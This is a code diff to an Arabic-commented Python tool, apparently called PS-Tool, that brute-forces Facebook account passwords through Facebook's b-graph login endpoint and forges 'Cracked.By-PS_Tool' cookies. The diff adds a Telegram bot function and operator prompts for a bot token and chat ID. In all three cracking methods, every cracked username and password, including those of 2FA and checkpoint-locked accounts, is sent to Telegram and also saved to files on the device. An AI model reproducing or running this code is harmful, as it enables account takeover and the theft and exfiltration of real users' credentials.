@@ -145,6 +145,15 @@ def curl_post_fast(url, data, headers):
         c.close()
         buffer.close()
 
+#----------------\<-TELEGRAM SEND FUNCTION->/----------------#
+def send_telegram(token, chat_id, message):
+    try:
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        post_data = f"chat_id={chat_id}&text={quote(message)}"
+        curl_post_fast(url, post_data, {"Content-Type": "application/x-www-form-urlencoded"})
+    except:
+        pass
+
 #----------------\<-UA-NORMAL-MIX->/----------------#
 def UA():
     fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
@@ -203,7 +212,7 @@ logo = f"""
 {xp} TODAYS   {xpxx} {__date__}
 {xlinex}"""
 
-#----------------\<-PS-TOOL CLASS (الكود الأصلي)->/----------------#
+#----------------\<-PS-TOOL CLASS->/----------------#
 class __PS__:
     def __init__(self) -> None:
         self.loop = 0
@@ -219,7 +228,16 @@ class __PS__:
         self.__LOCK__ = []
 
     def __MENU__(self) -> None:
+        global token_ps, id_ps
         __CLEAR__()
+        
+        # طلب التوكن والايدي مثل الكود الثاني
+        token_ps = input(f'{xp}  TOKEN {xpxx} ').strip()
+        print(xlinex)
+        
+        id_ps = input(f'{xp} ID {xpxx} ').strip()
+        print(xlinex)
+        
         print(f"{xp1} FILE CLONING ")
         print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
         print(f"{xp0} EXIT TOOLS ")
@@ -382,6 +400,7 @@ class __PS__:
         sys.exit()   
 
     def __M1X__(self, ids, names, passlist):
+        global token_ps, id_ps
         try:
             color = random.choice([
                 "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -417,7 +436,6 @@ class __PS__:
                 }
                 country_locale = random.choice(list(__locale__.keys()))
                 country_code = __locale__[country_locale]
-                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                 data = {
                     "adid": adid,
                     "format": "json",
@@ -472,6 +490,18 @@ class __PS__:
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
 
+                    # ارسال النتيجة الى تليجرام
+                    m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M1-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -490,6 +520,21 @@ class __PS__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
+                    
+                    # ارسال 2F الى تليجرام
+                    m = f"""حساب سكيور ❌ (2F)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M1-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     try:
                         os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
                         open('/sdcard/PS-/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
@@ -501,6 +546,21 @@ class __PS__:
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    # ارسال CP الى تليجرام
+                    m = f"""حساب سكيور ❌ (CP)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M1-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     try:
                         os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
                         open('/sdcard/PS-/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
@@ -515,6 +575,7 @@ class __PS__:
             pass
 
     def __M2X__(self, ids, names, passlist):
+        global token_ps, id_ps
         try:
             color = random.choice([
                 "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -606,6 +667,18 @@ class __PS__:
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+                    
+                    m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M2-B-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -623,6 +696,20 @@ class __PS__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    m = f"""حساب سكيور ❌ (2F)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M2-B-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     try:
                         os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
                         open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
@@ -633,6 +720,20 @@ class __PS__:
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    m = f"""حساب سكيور ❌ (CP)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M2-B-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     try:
                         os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
                         open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
@@ -647,6 +748,7 @@ class __PS__:
             pass
 
     def __M3X__(self, ids, names, passlist):
+        global token_ps, id_ps
         try:
             color = random.choice([
                 "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -734,6 +836,18 @@ class __PS__:
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+                    
+                    m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M3-API
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -751,6 +865,20 @@ class __PS__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    m = f"""حساب سكيور ❌ (2F)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M3-API
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     try:
                         os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
                         open('/sdcard/PS-/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
@@ -761,6 +889,20 @@ class __PS__:
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    m = f"""حساب سكيور ❌ (CP)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M3-API
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     try:
                         os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
                         open('/sdcard/PS-/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
@@ -796,7 +938,6 @@ brands = {
     "Huawei Y9a": "Huawei"
 }
 
-# قائمة الدول والأكواد
 countries_data = {
     "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
     "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
@@ -844,15 +985,7 @@ def get_network_code():
     else:
         return input(f'{xp} INPUT CHOSE (مثال: 0750 | 0770 | 0780) {xpxx} ').strip()
 
-def send_telegram(token, chat_id, message):
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        post_data = f"chat_id={chat_id}&text={quote(message)}"
-        curl_post_fast(url, post_data, {"Content-Type": "application/x-www-form-urlencoded"})
-    except:
-        pass
-
-def pm(email_or_phone, password):
+def pm_cracker(email_or_phone, password):
     device_id = str(uuid.uuid4())
     family_device_id = str(uuid.uuid4())
     secure_family_device_id = str(uuid.uuid4())
@@ -887,9 +1020,9 @@ def pm(email_or_phone, password):
     }
     return payload
 
-def get_cookies(ids, pw):
+def get_cookies_cracker(ids, pw):
     try:
-        data = pm(ids, pw)
+        data = pm_cracker(ids, pw)
         post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
         req = curl_post_fast('https://b-graph.facebook.com/auth/login', post_data, headers_cracker)
         if 'session_key' in req:
@@ -901,20 +1034,20 @@ def get_cookies(ids, pw):
     return "No Cookie"
 
 def crackfree(ids, pwxs):
-    global ok_cracker, loop_cracker
+    global ok_cracker, loop_cracker, token_cracker, id_cracker
     sys.stdout.write(f'\r\r\r\033[1;37m\033[1m{xp} {G}<[{W}PS-{loop_cracker}{G}]> {G}<[{W}OK-{ok_cracker}{G}]>')
     sys.stdout.flush()
     
     for pw in pwxs:
         try:
-            data = pm(ids, pw)
+            data = pm_cracker(ids, pw)
             post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
             req = curl_post_fast('https://b-graph.facebook.com/auth/login', post_data, headers_cracker)
             
             if 'session_key' in req:
                 uid = req["uid"]
                 ok_cracker += 1
-                coki = get_cookies(ids, pw)
+                coki = get_cookies_cracker(ids, pw)
                 
                 print(f"\r\r\033[0;32m\033[1m{xp} {G}<[PS-OK{G}]> {uid} | {pw}   ")
                 print(xlinex)
@@ -1020,7 +1153,7 @@ def menu_cracker():
     input(f"{xp} Press Enter to return to main menu...")
     main_menu()
 
-#----------------\<-MAIN MENU (القائمة الرئيسية)->/----------------#
+#----------------\<-MAIN MENU->/----------------#
 def main_menu():
     while True:
         os.system('clear' if os.name == 'posix' else 'cls')
